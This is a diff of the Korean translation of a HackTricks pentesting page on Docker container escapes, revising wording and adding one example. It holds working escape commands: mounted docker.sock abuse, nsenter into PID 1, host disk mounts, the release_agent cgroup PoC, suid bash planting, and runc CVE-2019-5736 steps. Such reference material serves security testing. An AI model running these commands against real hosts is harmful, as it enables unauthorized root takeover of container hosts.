@@ -2,18 +2,18 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## 자동 열거 및 탈출
+## Automatic Enumeration & Escape
 
-- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): 컨테이너를 **열거할 수 있습니다**
-- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 이 도구는 당신이 있는 컨테이너를 **열거하고 자동으로 탈출을 시도하는 데 유용합니다**
-- [**amicontained**](https://github.com/genuinetools/amicontained): 탈출 방법을 찾기 위해 컨테이너가 가진 권한을 얻는 데 유용한 도구
-- [**deepce**](https://github.com/stealthcopter/deepce): 컨테이너에서 열거하고 탈출하는 도구
+- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): 이 도구는 **컨테이너를 열거할 수 있습니다**
+- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): 이 도구는 **당신이 있는 컨테이너를 열거하는 데 유용하며 자동으로 탈출을 시도할 수 있습니다**
+- [**amicontained**](https://github.com/genuinetools/amicontained): 탈출 방법을 찾기 위해 컨테이너가 가진 권한을 얻는 데 유용한 도구입니다
+- [**deepce**](https://github.com/stealthcopter/deepce): 컨테이너에서 열거하고 탈출하는 도구입니다
 - [**grype**](https://github.com/anchore/grype): 이미지에 설치된 소프트웨어에 포함된 CVE를 가져옵니다
 
-## 마운트된 Docker 소켓 탈출
+## Mounted Docker Socket Escape
 
-어떤 방법으로든 **docker 소켓이** 도커 컨테이너 내부에 마운트되어 있다면, 당신은 그곳에서 탈출할 수 있습니다.\
-이는 일반적으로 어떤 이유로 도커 데몬에 연결해야 하는 도커 컨테이너에서 발생합니다.
+어떤 방법으로든 **docker socket이** 도커 컨테이너 내부에 마운트되어 있다면, 당신은 그곳에서 탈출할 수 있습니다.\
+이는 일반적으로 어떤 이유로 도커 데몬에 연결하여 작업을 수행해야 하는 도커 컨테이너에서 발생합니다.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
@@ -33,13 +33,13 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
-> [!NOTE]
+> [!TIP]
 > **docker 소켓이 예상치 못한 위치에 있는 경우**에도 **`docker`** 명령어와 매개변수 **`-H unix:///path/to/docker.sock`**를 사용하여 여전히 통신할 수 있습니다.
 
 Docker 데몬은 또한 [포트에서 수신 대기할 수 있습니다 (기본값 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) 또는 Systemd 기반 시스템에서는 Systemd 소켓 `fd://`를 통해 Docker 데몬과 통신할 수 있습니다.
 
-> [!NOTE]
-> 추가로, 다른 고급 런타임의 런타임 소켓에 주의하십시오:
+> [!TIP]
+> 추가로, 다른 고급 런타임의 런타임 소켓에 주의하세요:
 >
 > - dockershim: `unix:///var/run/dockershim.sock`
 > - containerd: `unix:///run/containerd/containerd.sock`
@@ -82,9 +82,9 @@ capsh --print
 ../docker-privileged.md
 {{#endref}}
 
-### 특권 + hostPID
+### Privileged + hostPID
 
-이 권한으로 **루트로 호스트에서 실행 중인 프로세스의 네임스페이스로 이동**할 수 있습니다. 예를 들어 init (pid:1)에서 다음을 실행하면 됩니다: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
+이 권한으로, 단순히 `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`를 실행하여 루트로 호스트에서 실행 중인 프로세스의 네임스페이스로 **이동할 수 있습니다** (init의 pid:1).
 
 컨테이너에서 다음을 실행하여 테스트하십시오:
 ```bash
@@ -92,15 +92,15 @@ docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 ### Privileged
 
-privileged 플래그만으로도 **호스트의 디스크에 접근**하거나 **release_agent 또는 다른 탈출 기법을 악용하여 탈출**을 시도할 수 있습니다.
+privileged 플래그만으로도 **호스트의 디스크에 접근**하거나 **release_agent 또는 다른 탈출을 악용하여 탈출**을 시도할 수 있습니다.
 
-다음 우회 방법을 컨테이너에서 실행하여 테스트하십시오:
+다음 우회 방법을 컨테이너에서 실행하여 테스트하세요:
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
 #### 디스크 마운트 - Poc1
 
-잘 구성된 도커 컨테이너는 **fdisk -l**과 같은 명령을 허용하지 않습니다. 그러나 `--privileged` 또는 `--device=/dev/sda1` 플래그가 지정된 잘못 구성된 도커 명령에서는 호스트 드라이브를 볼 수 있는 권한을 얻는 것이 가능합니다.
+잘 구성된 도커 컨테이너는 **fdisk -l**과 같은 명령을 허용하지 않습니다. 그러나 `--privileged` 또는 대문자로 지정된 `--device=/dev/sda1` 플래그가 있는 잘못 구성된 도커 명령에서는 호스트 드라이브를 볼 수 있는 권한을 얻는 것이 가능합니다.
 
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
@@ -134,7 +134,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
-#### 권한 상승 기존 release_agent 악용 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
+#### Privileged Escape 기존 release_agent 악용 ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 ```bash:Initial PoC
 # spawn a new container to exploit via:
 # docker run --rm -it --privileged ubuntu bash
@@ -210,15 +210,13 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 # Reads the output
 cat /output
 ```
-다음은 기술에 대한 **설명**입니다:
-
 {{#ref}}
 docker-release_agent-cgroups-escape.md
 {{#endref}}
 
-#### 권한 상승: 상대 경로를 모르는 release_agent 악용 - PoC3
+#### Privileged Escape Abusing release_agent without known the relative path - PoC3
 
-이전의 익스플로잇에서는 **호스트 파일 시스템 내의 컨테이너의 절대 경로가 공개됩니다**. 그러나 항상 그런 것은 아닙니다. 호스트 내의 컨테이너의 **절대 경로를 모르는 경우** 이 기술을 사용할 수 있습니다:
+이전의 익스플로잇에서는 **호스트 파일 시스템 내의 컨테이너의 절대 경로가 공개됩니다**. 그러나 항상 그런 것은 아닙니다. 호스트 내의 컨테이너의 절대 경로를 **모르는 경우** 이 기술을 사용할 수 있습니다:
 
 {{#ref}}
 release_agent-exploit-relative-paths-to-pids.md
@@ -312,10 +310,10 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ```
 #### 권한 상승: 민감한 마운트 악용
 
-여러 파일이 마운트될 수 있으며, 이는 **기본 호스트에 대한 정보를 제공합니다**. 이 중 일부는 **호스트에서 무언가가 발생할 때 실행될 수 있는 무언가를 나타낼 수 있습니다** (이는 공격자가 컨테이너에서 탈출할 수 있게 합니다).\
+여러 파일이 마운트되어 **기본 호스트에 대한 정보를 제공**할 수 있습니다. 이 중 일부는 **호스트가 어떤 일이 발생할 때 실행할 무언가를 나타낼 수 있습니다** (이는 공격자가 컨테이너에서 탈출할 수 있게 합니다).\
 이 파일의 악용은 다음을 허용할 수 있습니다:
 
-- release_agent (이전에 다룸)
+- release_agent (이미 이전에 다룸)
 - [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
 - [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
 - [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
@@ -323,20 +321,23 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 
 그러나 이 페이지에서 확인할 수 있는 **다른 민감한 파일**을 찾을 수 있습니다:
 
+
 {{#ref}}
 sensitive-mounts.md
 {{#endref}}
 
 ### 임의 마운트
 
-여러 경우에 **컨테이너가 호스트에서 일부 볼륨을 마운트하고 있는 것을 발견할 수 있습니다**. 이 볼륨이 올바르게 구성되지 않았다면 **민감한 데이터에 접근/수정할 수 있을지도 모릅니다**: 비밀 읽기, ssh authorized_keys 변경…
+여러 경우에 **컨테이너가 호스트에서 일부 볼륨을 마운트하고 있는 것을 발견할 수 있습니다**. 이 볼륨이 올바르게 구성되지 않았다면 **민감한 데이터에 접근/수정할 수 있을** 수 있습니다: 비밀 읽기, ssh authorized_keys 변경…
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
-### Privilege Escalation with 2 shells and host mount
+또 다른 흥미로운 예는 [**이 블로그**](https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce)에서 찾을 수 있으며, 여기서는 호스트의 `/usr/bin/` 및 `/bin/` 폴더가 컨테이너 내부에 마운트되어 있어 컨테이너의 루트 사용자가 이러한 폴더 내의 바이너리를 수정할 수 있음을 나타냅니다. 따라서, 만약 크론 작업이 `/etc/cron.d/popularity-contest`와 같은 바이너리를 사용하고 있다면, 이는 크론 작업에서 사용되는 바이너리를 수정하여 컨테이너에서 탈출할 수 있게 합니다.
 
-컨테이너 내에서 **root로 접근**할 수 있고 호스트에서 일부 폴더가 마운트되어 있으며 **비특권 사용자로 호스트에 탈출**하고 마운트된 폴더에 대한 읽기 권한이 있는 경우,\
-컨테이너 내의 **마운트된 폴더**에 **bash suid 파일**을 생성하고 **호스트에서 실행**하여 권한 상승을 할 수 있습니다.
+### 2개의 셸과 호스트 마운트를 이용한 권한 상승
+
+호스트에서 마운트된 폴더가 있는 **컨테이너 내부에서 root로 접근할 수** 있고, **비특권 사용자로 호스트에 탈출했으며** 마운트된 폴더에 대한 읽기 권한이 있는 경우,\
+**컨테이너** 내부의 **마운트된 폴더**에 **bash suid 파일**을 생성하고 **호스트에서 실행**하여 권한 상승을 할 수 있습니다.
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -346,10 +347,10 @@ bash -p #From non priv inside mounted folder
 ```
 ### Privilege Escalation with 2 shells
 
-컨테이너 내에서 **root로 접근할 수** 있고 **비특권 사용자로 호스트에 탈출했다면**, 두 개의 셸을 악용하여 **호스트 내에서 privesc를 수행할 수** 있습니다. 컨테이너 내에서 MKNOD 권한이 있는 경우(기본적으로 있음) [**이 게시물에서 설명된 대로**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)입니다.\
-이러한 권한을 통해 컨테이너 내의 root 사용자는 **블록 장치 파일을 생성할 수** 있습니다. 장치 파일은 **기본 하드웨어 및 커널 모듈에 접근하는 데 사용되는 특수 파일**입니다. 예를 들어, /dev/sda 블록 장치 파일은 **시스템 디스크의 원시 데이터를 읽는 데 접근을 제공합니다**.
+컨테이너 내에서 **root로 접근할 수** 있고 **비특권 사용자로 호스트에 탈출했다면**, 두 개의 셸을 악용하여 **호스트 내에서 privesc를 수행할 수** 있습니다. 컨테이너 내에서 MKNOD 권한이 있는 경우(기본적으로 활성화되어 있음) [**이 포스트에서 설명된 대로**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)입니다.\
+이러한 권한을 통해 컨테이너 내의 root 사용자는 **블록 장치 파일을 생성할 수** 있습니다. 장치 파일은 **기본 하드웨어 및 커널 모듈에 접근하는 데 사용되는 특수 파일**입니다. 예를 들어, /dev/sda 블록 장치 파일은 **시스템 디스크의 원시 데이터를 읽는** 데 접근을 제공합니다.
 
-Docker는 cgroup 정책을 시행하여 컨테이너 내에서 블록 장치 오용을 방지하며, **블록 장치 읽기/쓰기 작업을 차단합니다**. 그럼에도 불구하고, 블록 장치가 **컨테이너 내에서 생성되면**, **/proc/PID/root/** 디렉토리를 통해 컨테이너 외부에서 접근할 수 있게 됩니다. 이 접근은 **프로세스 소유자가 컨테이너 내부와 외부에서 동일해야** 합니다.
+Docker는 cgroup 정책을 시행하여 컨테이너 내에서 블록 장치 오용을 방지하며, **블록 장치 읽기/쓰기 작업을 차단**합니다. 그럼에도 불구하고, 블록 장치가 **컨테이너 내에서 생성되면**, **/proc/PID/root/** 디렉토리를 통해 컨테이너 외부에서 접근할 수 있게 됩니다. 이 접근은 **프로세스 소유자가 컨테이너 내외부에서 동일해야** 합니다.
 
 **Exploitation** 예시는 이 [**writeup**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/)에서 확인할 수 있습니다:
 ```bash
@@ -404,7 +405,7 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
-다른 프로세스의 파일 설명자에 **접근하고 열린 파일을 읽을 수 있습니다**:
+다른 프로세스의 파일 디스크립터에 **접근하고 열린 파일을 읽을 수 있습니다**:
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -417,7 +418,7 @@ cat /proc/635813/fd/4
 당신은 또한 **프로세스를 종료하고 DoS를 유발할 수 있습니다**.
 
 > [!WARNING]
-> 만약 당신이 **컨테이너 외부의 프로세스에 대한 권한 있는 접근**을 가지고 있다면, `nsenter --target <pid> --all` 또는 `nsenter --target <pid> --mount --net --pid --cgroup`와 같은 명령을 실행하여 **해당 프로세스와 동일한 ns 제한**(바라건대 없음) **으로 셸을 실행할 수 있습니다.**
+> 만약 당신이 **컨테이너 외부의 프로세스에 대한 권한 있는 접근을 somehow 가지고 있다면**, `nsenter --target <pid> --all` 또는 `nsenter --target <pid> --mount --net --pid --cgroup`와 같은 명령을 실행하여 **해당 프로세스와 동일한 ns 제한**(바라건대 없음) **으로 셸을 실행할 수 있습니다.**
 
 ### hostNetwork
 ```
@@ -438,14 +439,14 @@ docker run --rm -it --network=host ubuntu bash
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
-`hostIPC=true`를 사용하면 호스트의 프로세스 간 통신(IPC) 리소스에 접근할 수 있습니다. 예를 들어, `/dev/shm`의 **공유 메모리**와 같은 리소스입니다. 이는 동일한 IPC 리소스를 다른 호스트 또는 포드 프로세스가 사용할 때 읽기/쓰기가 가능하게 합니다. `ipcs`를 사용하여 이러한 IPC 메커니즘을 더 자세히 검사하십시오.
+`hostIPC=true`를 설정하면 호스트의 프로세스 간 통신(IPC) 리소스에 접근할 수 있습니다. 예를 들어, `/dev/shm`의 **공유 메모리**에 접근할 수 있습니다. 이는 동일한 IPC 리소스를 다른 호스트 또는 포드 프로세스가 사용할 때 읽기/쓰기가 가능하다는 것을 의미합니다. `ipcs`를 사용하여 이러한 IPC 메커니즘을 더 자세히 검사하십시오.
 
-- **/dev/shm 검사** - 이 공유 메모리 위치에서 파일을 찾아보세요: `ls -la /dev/shm`
-- **기존 IPC 시설 검사** – `/usr/bin/ipcs`를 사용하여 어떤 IPC 시설이 사용되고 있는지 확인할 수 있습니다. 다음과 같이 확인하세요: `ipcs -a`
+- **/dev/shm 검사** - 이 공유 메모리 위치에서 파일을 찾아보십시오: `ls -la /dev/shm`
+- **기존 IPC 시설 검사** – `/usr/bin/ipcs`를 사용하여 어떤 IPC 시설이 사용되고 있는지 확인할 수 있습니다. 다음과 같이 확인하십시오: `ipcs -a`
 
 ### 권한 복구
 
-시스템 호출 **`unshare`**가 금지되지 않은 경우, 모든 권한을 복구할 수 있습니다:
+시스템 호출 **`unshare`**가 금지되지 않았다면, 다음을 실행하여 모든 권한을 복구할 수 있습니다:
 ```bash
 unshare -UrmCpf bash
 # Check them with
@@ -453,16 +454,16 @@ cat /proc/self/status | grep CapEff
 ```
 ### 사용자 네임스페이스 악용을 통한 심볼릭 링크
 
-게시물 [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)에서 설명된 두 번째 기술은 사용자 네임스페이스와 함께 바인드 마운트를 악용하여 호스트 내부의 파일에 영향을 미치는 방법(특정 경우에는 파일 삭제)을 나타냅니다.
+게시물 [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/)에서 설명된 두 번째 기술은 사용자 네임스페이스와 함께 바인드 마운트를 악용하여 호스트 내부의 파일에 영향을 미치는 방법을 나타냅니다(특정 경우에는 파일 삭제).
 
 ## CVE
 
 ### Runc 취약점 (CVE-2019-5736)
 
-루트로 `docker exec`를 실행할 수 있는 경우(아마도 sudo를 사용하여), CVE-2019-5736을 악용하여 컨테이너에서 탈출하여 권한 상승을 시도합니다(취약점 [여기](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). 이 기술은 기본적으로 **컨테이너에서 호스트의 _**/bin/sh**_ 바이너리를 **덮어씁니다**, 따라서 docker exec를 실행하는 모든 사용자가 페이로드를 트리거할 수 있습니다.
+`docker exec`를 루트로 실행할 수 있는 경우(아마도 sudo를 사용하여), CVE-2019-5736을 악용하여 컨테이너에서 탈출하여 권한을 상승시키려고 시도합니다(취약점 [여기](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). 이 기술은 기본적으로 **컨테이너에서 호스트의 _**/bin/sh**_ 바이너리를 **덮어씁니다**, 따라서 docker exec를 실행하는 모든 사용자가 페이로드를 트리거할 수 있습니다.
 
-페이로드를 적절히 변경하고 `go build main.go`로 main.go를 빌드합니다. 결과 바이너리는 실행을 위해 도커 컨테이너에 배치해야 합니다.\
-실행 시 `[+] Overwritten /bin/sh successfully`가 표시되면 호스트 머신에서 다음을 실행해야 합니다:
+페이로드를 적절히 변경하고 `go build main.go`로 main.go를 빌드합니다. 결과 바이너리는 실행을 위해 도커 컨테이너에 배치되어야 합니다.\
+실행 시, `[+] Overwritten /bin/sh successfully`가 표시되면 호스트 머신에서 다음을 실행해야 합니다:
 
 `docker exec -it <container-name> /bin/sh`
 
@@ -470,7 +471,7 @@ cat /proc/self/status | grep CapEff
 
 자세한 정보는: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
-> [!NOTE]
+> [!TIP]
 > 컨테이너가 취약할 수 있는 다른 CVE도 있으며, [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)에서 목록을 찾을 수 있습니다.
 
 ## 도커 사용자 정의 탈출
@@ -479,8 +480,8 @@ cat /proc/self/status | grep CapEff
 
 - **네임스페이스:** 프로세스는 네임스페이스를 통해 **다른 프로세스와 완전히 분리되어야** 하므로, 네임스페이스로 인해 다른 프로세스와 상호작용하여 탈출할 수 없습니다(기본적으로 IPC, 유닉스 소켓, 네트워크 서비스, D-Bus, 다른 프로세스의 `/proc`를 통해 통신할 수 없음).
 - **루트 사용자**: 기본적으로 프로세스를 실행하는 사용자는 루트 사용자입니다(그러나 권한은 제한적입니다).
-- **권한**: 도커는 다음 권한을 남깁니다: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-- **시스템 호출**: **루트 사용자가 호출할 수 없는** 시스템 호출입니다(권한 부족 + Seccomp로 인해). 다른 시스템 호출은 탈출을 시도하는 데 사용될 수 있습니다.
+- **능력**: 도커는 다음 능력을 남깁니다: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+- **시스템 호출**: **루트 사용자가 호출할 수 없는** 시스템 호출입니다(능력 부족 + Seccomp로 인해). 다른 시스템 호출은 탈출을 시도하는 데 사용될 수 있습니다.
 
 {{#tabs}}
 {{#tab name="x64 syscalls"}}
